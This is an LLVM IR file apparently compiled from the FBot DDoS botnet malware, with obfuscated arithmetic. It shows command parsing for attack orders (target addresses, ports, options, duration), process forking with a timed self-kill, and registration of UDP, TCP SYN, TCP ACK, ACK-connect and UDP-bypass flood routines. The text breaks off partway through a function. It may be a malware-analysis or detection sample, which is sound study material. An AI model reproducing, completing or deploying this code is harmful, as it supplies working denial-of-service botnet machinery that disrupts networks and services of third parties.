; ModuleID = 'host/ir_sub/FBot.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.option = type { i8, i16, i8* }
%struct.target = type { i32, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.timeval = type { i64, i64 }

@LOCAL_ADDRESS = common global i32 0, align 4
@command_list = common global [6 x %struct.command] zeroinitializer, align 16
@.str = private unnamed_addr constant [34 x i8] c"Sending SYN with ACK: %d SEQ: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Received SYN-ACK with ACK: %d SEQ: %d\0A\00", align 1
@t = internal global i32 0, align 4
@p = internal global i32 0, align 4
@c = internal global i32 0, align 4
@f = internal global i32 0, align 4
@alpha_set = internal global [36 x i8] c"abcdefghijklmnopqrstuvwxyz0123456789", align 16

; Function Attrs: noinline nounwind uwtable
define i8* @retrieve_opt_str(%struct.option*, i8 zeroext, i8 zeroext, i8*) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i8* %3, i8** %8, align 8
  store i32 0, i32* %10, align 4
  %11 = load i8*, i8** %8, align 8
  store i8* %11, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %12

; <label>:12:                                     ; preds = %36, %4
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  br i1 %16, label %17, label %42

; <label>:17:                                     ; preds = %12
  %18 = load %struct.option*, %struct.option** %5, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.option, %struct.option* %18, i64 %20
  %22 = getelementptr inbounds %struct.option, %struct.option* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %7, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  br i1 %27, label %28, label %35

; <label>:28:                                     ; preds = %17
  %29 = load %struct.option*, %struct.option** %5, align 8
  %30 = load i32, i32* %10, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.option, %struct.option* %29, i64 %31
  %33 = getelementptr inbounds %struct.option, %struct.option* %32, i32 0, i32 2
  %34 = load i8*, i8** %33, align 8
  store i8* %34, i8** %9, align 8
  br label %35

; <label>:35:                                     ; preds = %28, %17
  br label %36

; <label>:36:                                     ; preds = %35
  %37 = load i32, i32* %10, align 4
  %38 = add i32 %37, 577581422
  %39 = add i32 %38, 1
  %40 = sub i32 %39, 577581422
  %41 = add nsw i32 %37, 1
  store i32 %40, i32* %10, align 4
  br label %12

; <label>:42:                                     ; preds = %12
  %43 = load i8*, i8** %9, align 8
  ret i8* %43
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @retrieve_opt_num(%struct.option*, i8 zeroext, i8 zeroext, i16 zeroext) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i16 %3, i16* %8, align 2
  store i16 0, i16* %9, align 2
  store i32 0, i32* %10, align 4
  %11 = load i16, i16* %8, align 2
  store i16 %11, i16* %9, align 2
  store i32 0, i32* %10, align 4
  br label %12

; <label>:12:                                     ; preds = %38, %4
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  br i1 %16, label %17, label %44

; <label>:17:                                     ; preds = %12
  %18 = load %struct.option*, %struct.option** %5, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.option, %struct.option* %18, i64 %20
  %22 = getelementptr inbounds %struct.option, %struct.option* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %7, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  br i1 %27, label %28, label %37

; <label>:28:                                     ; preds = %17
  %29 = load %struct.option*, %struct.option** %5, align 8
  %30 = load i32, i32* %10, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.option, %struct.option* %29, i64 %31
  %33 = getelementptr inbounds %struct.option, %struct.option* %32, i32 0, i32 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34) #7
  %36 = trunc i32 %35 to i16
  store i16 %36, i16* %9, align 2
  br label %37

; <label>:37:                                     ; preds = %28, %17
  br label %38

; <label>:38:                                     ; preds = %37
  %39 = load i32, i32* %10, align 4
  %40 = sub i32 %39, -417755816
  %41 = add i32 %40, 1
  %42 = add i32 %41, -417755816
  %43 = add nsw i32 %39, 1
  store i32 %42, i32* %10, align 4
  br label %12

; <label>:44:                                     ; preds = %12
  %45 = load i16, i16* %9, align 2
  ret i16 %45
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @retrieve_opt_ipv4(%struct.option*, i8 zeroext, i8 zeroext, i32) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %8, align 4
  store i32 %11, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %12

; <label>:12:                                     ; preds = %37, %4
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  br i1 %16, label %17, label %43

; <label>:17:                                     ; preds = %12
  %18 = load %struct.option*, %struct.option** %5, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.option, %struct.option* %18, i64 %20
  %22 = getelementptr inbounds %struct.option, %struct.option* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %7, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  br i1 %27, label %28, label %36

; <label>:28:                                     ; preds = %17
  %29 = load %struct.option*, %struct.option** %5, align 8
  %30 = load i32, i32* %10, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.option, %struct.option* %29, i64 %31
  %33 = getelementptr inbounds %struct.option, %struct.option* %32, i32 0, i32 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @inet_addr(i8* %34) #8
  store i32 %35, i32* %9, align 4
  br label %36

; <label>:36:                                     ; preds = %28, %17
  br label %37

; <label>:37:                                     ; preds = %36
  %38 = load i32, i32* %10, align 4
  %39 = sub i32 %38, -85690299
  %40 = add i32 %39, 1
  %41 = add i32 %40, -85690299
  %42 = add nsw i32 %38, 1
  store i32 %41, i32* %10, align 4
  br label %12

; <label>:43:                                     ; preds = %12
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @command_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca %struct.option*, align 8
  %8 = alloca %struct.target*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i16, align 2
  %12 = alloca i16, align 2
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  store %struct.option* null, %struct.option** %7, align 8
  store %struct.target* null, %struct.target** %8, align 8
  store i32 0, i32* %9, align 4
  store i8 0, i8* %10, align 1
  store i16 0, i16* %11, align 2
  %13 = load i8*, i8** %3, align 8
  %14 = load i8, i8* %13, align 1
  store i8 %14, i8* %5, align 1
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 1
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 8730258478992558200
  %20 = sub i64 %19, 1
  %21 = add i64 %20, 8730258478992558200
  %22 = sub i64 %18, 1
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  %24 = load i8*, i8** %3, align 8
  %25 = bitcast i8* %24 to i16*
  %26 = load i16, i16* %25, align 2
  store i16 %26, i16* %11, align 2
  %27 = load i16, i16* %11, align 2
  %28 = call zeroext i16 @ntohs(i16 zeroext %27) #9
  store i16 %28, i16* %11, align 2
  %29 = load i8*, i8** %3, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 2
  store i8* %30, i8** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 %32, -3111368220363887019
  %34 = sub i64 %33, 2
  %35 = sub i64 %34, -3111368220363887019
  %36 = sub i64 %32, 2
  %37 = trunc i64 %35 to i32
  store i32 %37, i32* %4, align 4
  %38 = load i8*, i8** %3, align 8
  %39 = load i8, i8* %38, align 1
  store i8 %39, i8* %6, align 1
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  store i8* %41, i8** %3, align 8
  %42 = load i32, i32* %4, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 %43, 1466818663256979038
  %45 = sub i64 %44, 1
  %46 = add i64 %45, 1466818663256979038
  %47 = sub i64 %43, 1
  %48 = trunc i64 %46 to i32
  store i32 %48, i32* %4, align 4
  %49 = load i8, i8* %6, align 1
  %50 = zext i8 %49 to i64
  %51 = call noalias i8* @calloc(i64 %50, i64 8) #8
  %52 = bitcast i8* %51 to %struct.target*
  store %struct.target* %52, %struct.target** %8, align 8
  %53 = load %struct.target*, %struct.target** %8, align 8
  %54 = icmp ne %struct.target* %53, null
  br i1 %54, label %56, label %55

; <label>:55:                                     ; preds = %2
  br label %236

; <label>:56:                                     ; preds = %2
  store i32 0, i32* %9, align 4
  br label %57

; <label>:57:                                     ; preds = %108, %56
  %58 = load i32, i32* %9, align 4
  %59 = load i8, i8* %6, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %58, %60
  br i1 %61, label %62, label %113

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %3, align 8
  %64 = bitcast i8* %63 to i32*
  %65 = load i32, i32* %64, align 4
  %66 = load %struct.target*, %struct.target** %8, align 8
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.target, %struct.target* %66, i64 %68
  %70 = getelementptr inbounds %struct.target, %struct.target* %69, i32 0, i32 0
  store i32 %65, i32* %70, align 4
  %71 = load i8*, i8** %3, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 4
  store i8* %72, i8** %3, align 8
  %73 = load i32, i32* %4, align 4
  %74 = sext i32 %73 to i64
  %75 = sub i64 0, 4
  %76 = add i64 %74, %75
  %77 = sub i64 %74, 4
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %4, align 4
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i16*
  %81 = load i16, i16* %80, align 2
  %82 = load %struct.target*, %struct.target** %8, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.target, %struct.target* %82, i64 %84
  %86 = getelementptr inbounds %struct.target, %struct.target* %85, i32 0, i32 1
  store i16 %81, i16* %86, align 4
  %87 = load %struct.target*, %struct.target** %8, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.target, %struct.target* %87, i64 %89
  %91 = getelementptr inbounds %struct.target, %struct.target* %90, i32 0, i32 1
  %92 = load i16, i16* %91, align 4
  %93 = call zeroext i16 @ntohs(i16 zeroext %92) #9
  %94 = load %struct.target*, %struct.target** %8, align 8
  %95 = load i32, i32* %9, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.target, %struct.target* %94, i64 %96
  %98 = getelementptr inbounds %struct.target, %struct.target* %97, i32 0, i32 1
  store i16 %93, i16* %98, align 4
  %99 = load i8*, i8** %3, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 2
  store i8* %100, i8** %3, align 8
  %101 = load i32, i32* %4, align 4
  %102 = sext i32 %101 to i64
  %103 = add i64 %102, -5790813930717405546
  %104 = sub i64 %103, 2
  %105 = sub i64 %104, -5790813930717405546
  %106 = sub i64 %102, 2
  %107 = trunc i64 %105 to i32
  store i32 %107, i32* %4, align 4
  br label %108

; <label>:108:                                    ; preds = %62
  %109 = load i32, i32* %9, align 4
  %110 = sub i32 0, 1
  %111 = sub i32 %109, %110
  %112 = add nsw i32 %109, 1
  store i32 %111, i32* %9, align 4
  br label %57

; <label>:113:                                    ; preds = %57
  %114 = load i8*, i8** %3, align 8
  %115 = load i8, i8* %114, align 1
  store i8 %115, i8* %10, align 1
  %116 = load i8*, i8** %3, align 8
  %117 = getelementptr inbounds i8, i8* %116, i64 1
  store i8* %117, i8** %3, align 8
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = add i64 %119, 2207691820148490851
  %121 = sub i64 %120, 1
  %122 = sub i64 %121, 2207691820148490851
  %123 = sub i64 %119, 1
  %124 = trunc i64 %122 to i32
  store i32 %124, i32* %4, align 4
  %125 = load i8, i8* %10, align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 0
  br i1 %127, label %128, label %135

; <label>:128:                                    ; preds = %113
  %129 = load i8, i8* %5, align 1
  %130 = load %struct.option*, %struct.option** %7, align 8
  %131 = load i8, i8* %10, align 1
  %132 = load %struct.target*, %struct.target** %8, align 8
  %133 = load i8, i8* %6, align 1
  %134 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %129, %struct.option* %130, i8 zeroext %131, %struct.target* %132, i8 zeroext %133, i16 zeroext %134)
  br label %236

; <label>:135:                                    ; preds = %113
  %136 = load i8, i8* %10, align 1
  %137 = zext i8 %136 to i64
  %138 = call noalias i8* @calloc(i64 %137, i64 16) #8
  %139 = bitcast i8* %138 to %struct.option*
  store %struct.option* %139, %struct.option** %7, align 8
  %140 = load %struct.option*, %struct.option** %7, align 8
  %141 = icmp ne %struct.option* %140, null
  br i1 %141, label %145, label %142

; <label>:142:                                    ; preds = %135
  %143 = load %struct.target*, %struct.target** %8, align 8
  %144 = bitcast %struct.target* %143 to i8*
  call void @free(i8* %144) #8
  br label %236

; <label>:145:                                    ; preds = %135
  store i32 0, i32* %9, align 4
  br label %146

; <label>:146:                                    ; preds = %223, %145
  %147 = load i32, i32* %9, align 4
  %148 = load i8, i8* %10, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  br i1 %150, label %151, label %229

; <label>:151:                                    ; preds = %146
  store i16 0, i16* %12, align 2
  %152 = load i8*, i8** %3, align 8
  %153 = load i8, i8* %152, align 1
  %154 = load %struct.option*, %struct.option** %7, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.option, %struct.option* %154, i64 %156
  %158 = getelementptr inbounds %struct.option, %struct.option* %157, i32 0, i32 0
  store i8 %153, i8* %158, align 8
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 1
  store i8* %160, i8** %3, align 8
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = add i64 %162, 8946609367217858319
  %164 = sub i64 %163, 1
  %165 = sub i64 %164, 8946609367217858319
  %166 = sub i64 %162, 1
  %167 = trunc i64 %165 to i32
  store i32 %167, i32* %4, align 4
  %168 = load i8*, i8** %3, align 8
  %169 = bitcast i8* %168 to i16*
  %170 = load i16, i16* %169, align 2
  store i16 %170, i16* %12, align 2
  %171 = load i16, i16* %12, align 2
  %172 = call zeroext i16 @ntohs(i16 zeroext %171) #9
  store i16 %172, i16* %12, align 2
  %173 = load i8*, i8** %3, align 8
  %174 = getelementptr inbounds i8, i8* %173, i64 2
  store i8* %174, i8** %3, align 8
  %175 = load i32, i32* %4, align 4
  %176 = sext i32 %175 to i64
  %177 = sub i64 0, 2
  %178 = add i64 %176, %177
  %179 = sub i64 %176, 2
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i16, i16* %12, align 2
  %182 = zext i16 %181 to i32
  %183 = add i32 %182, 1048574921
  %184 = add i32 %183, 1
  %185 = sub i32 %184, 1048574921
  %186 = add nsw i32 %182, 1
  %187 = sext i32 %185 to i64
  %188 = call noalias i8* @malloc(i64 %187) #8
  %189 = load %struct.option*, %struct.option** %7, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.option, %struct.option* %189, i64 %191
  %193 = getelementptr inbounds %struct.option, %struct.option* %192, i32 0, i32 2
  store i8* %188, i8** %193, align 8
  %194 = load %struct.option*, %struct.option** %7, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.option, %struct.option* %194, i64 %196
  %198 = getelementptr inbounds %struct.option, %struct.option* %197, i32 0, i32 2
  %199 = load i8*, i8** %198, align 8
  %200 = load i8*, i8** %3, align 8
  %201 = load i16, i16* %12, align 2
  %202 = zext i16 %201 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %199, i8* %200, i64 %202, i32 1, i1 false)
  %203 = load %struct.option*, %struct.option** %7, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.option, %struct.option* %203, i64 %205
  %207 = getelementptr inbounds %struct.option, %struct.option* %206, i32 0, i32 2
  %208 = load i8*, i8** %207, align 8
  %209 = load i16, i16* %12, align 2
  %210 = zext i16 %209 to i64
  %211 = getelementptr inbounds i8, i8* %208, i64 %210
  store i8 0, i8* %211, align 1
  %212 = load i16, i16* %12, align 2
  %213 = zext i16 %212 to i32
  %214 = load i8*, i8** %3, align 8
  %215 = sext i32 %213 to i64
  %216 = getelementptr inbounds i8, i8* %214, i64 %215
  store i8* %216, i8** %3, align 8
  %217 = load i16, i16* %12, align 2
  %218 = zext i16 %217 to i32
  %219 = load i32, i32* %4, align 4
  %220 = sub i32 0, %218
  %221 = add i32 %219, %220
  %222 = sub nsw i32 %219, %218
  store i32 %221, i32* %4, align 4
  br label %223

; <label>:223:                                    ; preds = %151
  %224 = load i32, i32* %9, align 4
  %225 = sub i32 %224, 750925525
  %226 = add i32 %225, 1
  %227 = add i32 %226, 750925525
  %228 = add nsw i32 %224, 1
  store i32 %227, i32* %9, align 4
  br label %146

; <label>:229:                                    ; preds = %146
  %230 = load i8, i8* %5, align 1
  %231 = load %struct.option*, %struct.option** %7, align 8
  %232 = load i8, i8* %10, align 1
  %233 = load %struct.target*, %struct.target** %8, align 8
  %234 = load i8, i8* %6, align 1
  %235 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %230, %struct.option* %231, i8 zeroext %232, %struct.target* %233, i8 zeroext %234, i16 zeroext %235)
  br label %236

; <label>:236:                                    ; preds = %229, %142, %128, %55
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #3

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: noinline nounwind uwtable
define internal void @command_flood(i8 zeroext, %struct.option*, i8 zeroext, %struct.target*, i8 zeroext, i16 zeroext) #0 {
  %7 = alloca i8, align 1
  %8 = alloca %struct.option*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca i16, align 2
  %13 = alloca i8* (...)*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.arguments, align 8
  store i8 %0, i8* %7, align 1
  store %struct.option* %1, %struct.option** %8, align 8
  store i8 %2, i8* %9, align 1
  store %struct.target* %3, %struct.target** %10, align 8
  store i8 %4, i8* %11, align 1
  store i16 %5, i16* %12, align 2
  store i32 -1, i32* %14, align 4
  store i32 -1, i32* %15, align 4
  %17 = load i8, i8* %7, align 1
  %18 = call i8* (...)* @retrieve_command_func(i8 zeroext %17)
  store i8* (...)* %18, i8* (...)** %13, align 8
  %19 = load i8* (...)*, i8* (...)** %13, align 8
  %20 = icmp ne i8* (...)* %19, null
  br i1 %20, label %22, label %21

; <label>:21:                                     ; preds = %6
  br label %54

; <label>:22:                                     ; preds = %6
  %23 = load %struct.target*, %struct.target** %10, align 8
  %24 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 0
  store %struct.target* %23, %struct.target** %24, align 8
  %25 = load i8, i8* %9, align 1
  %26 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 2
  store i8 %25, i8* %26, align 8
  %27 = load i8, i8* %11, align 1
  %28 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 3
  store i8 %27, i8* %28, align 1
  %29 = load %struct.option*, %struct.option** %8, align 8
  %30 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 1
  store %struct.option* %29, %struct.option** %30, align 8
  %31 = load i16, i16* %12, align 2
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 4
  store i16 %31, i16* %32, align 2
  %33 = call i32 @fork() #8
  store i32 %33, i32* %14, align 4
  %34 = load i32, i32* %14, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %22
  br label %54

; <label>:37:                                     ; preds = %22
  %38 = load i32, i32* %14, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %54

; <label>:41:                                     ; preds = %37
  %42 = call i32 @fork() #8
  store i32 %42, i32* %15, align 4
  %43 = load i32, i32* %15, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %41
  call void @exit(i32 1) #10
  unreachable

; <label>:46:                                     ; preds = %41
  %47 = load i32, i32* %15, align 4
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %46
  call void @terminate_command(%struct.arguments* %16)
  br label %50

; <label>:50:                                     ; preds = %49, %46
  %51 = load i8* (...)*, i8* (...)** %13, align 8
  %52 = bitcast i8* (...)* %51 to i8* (%struct.arguments*, ...)*
  %53 = call i8* (%struct.arguments*, ...) %52(%struct.arguments* %16)
  br label %54

; <label>:54:                                     ; preds = %50, %40, %36, %21
  ret void
}

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define internal i8* (...)* @retrieve_command_func(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = zext i8 %3 to i64
  %5 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %4
  %6 = getelementptr inbounds %struct.command, %struct.command* %5, i32 0, i32 1
  %7 = load i8* (...)*, i8* (...)** %6, align 8
  ret i8* (...)* %7
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @terminate_command(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 -1, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %5 = load %struct.arguments*, %struct.arguments** %2, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %5, i32 0, i32 4
  %7 = load i16, i16* %6, align 2
  %8 = zext i16 %7 to i32
  %9 = call i32 @sleep(i32 %8)
  %10 = call i32 @getppid() #8
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %1
  %14 = load i32, i32* %3, align 4
  %15 = call i32 @kill(i32 %14, i32 9) #8
  br label %16

; <label>:16:                                     ; preds = %13, %1
  %17 = load %struct.arguments*, %struct.arguments** %2, align 8
  %18 = getelementptr inbounds %struct.arguments, %struct.arguments* %17, i32 0, i32 0
  %19 = load %struct.target*, %struct.target** %18, align 8
  %20 = icmp ne %struct.target* %19, null
  br i1 %20, label %21, label %26

; <label>:21:                                     ; preds = %16
  %22 = load %struct.arguments*, %struct.arguments** %2, align 8
  %23 = getelementptr inbounds %struct.arguments, %struct.arguments* %22, i32 0, i32 0
  %24 = load %struct.target*, %struct.target** %23, align 8
  %25 = bitcast %struct.target* %24 to i8*
  call void @free(i8* %25) #8
  br label %26

; <label>:26:                                     ; preds = %21, %16
  %27 = load %struct.arguments*, %struct.arguments** %2, align 8
  %28 = getelementptr inbounds %struct.arguments, %struct.arguments* %27, i32 0, i32 1
  %29 = load %struct.option*, %struct.option** %28, align 8
  %30 = icmp ne %struct.option* %29, null
  br i1 %30, label %32, label %31

; <label>:31:                                     ; preds = %26
  call void @exit(i32 0) #10
  unreachable

; <label>:32:                                     ; preds = %26
  store i32 0, i32* %4, align 4
  br label %33

; <label>:33:                                     ; preds = %49, %32
  %34 = load i32, i32* %4, align 4
  %35 = load %struct.arguments*, %struct.arguments** %2, align 8
  %36 = getelementptr inbounds %struct.arguments, %struct.arguments* %35, i32 0, i32 2
  %37 = load i8, i8* %36, align 8
  %38 = zext i8 %37 to i32
  %39 = icmp slt i32 %34, %38
  br i1 %39, label %40, label %55

; <label>:40:                                     ; preds = %33
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 1
  %43 = load %struct.option*, %struct.option** %42, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.option, %struct.option* %43, i64 %45
  %47 = getelementptr inbounds %struct.option, %struct.option* %46, i32 0, i32 2
  %48 = load i8*, i8** %47, align 8
  call void @free(i8* %48) #8
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %4, align 4
  %51 = sub i32 %50, -525198132
  %52 = add i32 %51, 1
  %53 = add i32 %52, -525198132
  %54 = add nsw i32 %50, 1
  store i32 %53, i32* %4, align 4
  br label %33

; <label>:55:                                     ; preds = %33
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 1
  %58 = load %struct.option*, %struct.option** %57, align 8
  %59 = bitcast %struct.option* %58 to i8*
  call void @free(i8* %59) #8
  call void @exit(i32 0) #10
  unreachable
                                                  ; No predecessors!
  ret void
}

declare i32 @sleep(i32) #6

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @init_commands() #0 {
  call void @load_command(i8 zeroext 1, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udp to i8* (...)*))
  call void @load_command(i8 zeroext 3, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_syn to i8* (...)*))
  call void @load_command(i8 zeroext 2, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack to i8* (...)*))
  call void @load_command(i8 zeroext 7, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack_connect to i8* (...)*))
  call void @load_command(i8 zeroext 20, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udpbypass to i8* (...)*))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @load_command(i8 zeroext, i8* (...)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8* (...)*, align 8
  store i8 %0, i8* %3, align 1
  store i8* (...)* %1, i8* (...)** %4, align 8
  %5 = load i8, i8* %3, align 1
  %6 = load i8, i8* %3, align 1
  %7 = zext i8 %6 to i64
  %8 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %7
  %9 = getelementptr inbounds %struct.command, %struct.command* %8, i32 0, i32 0
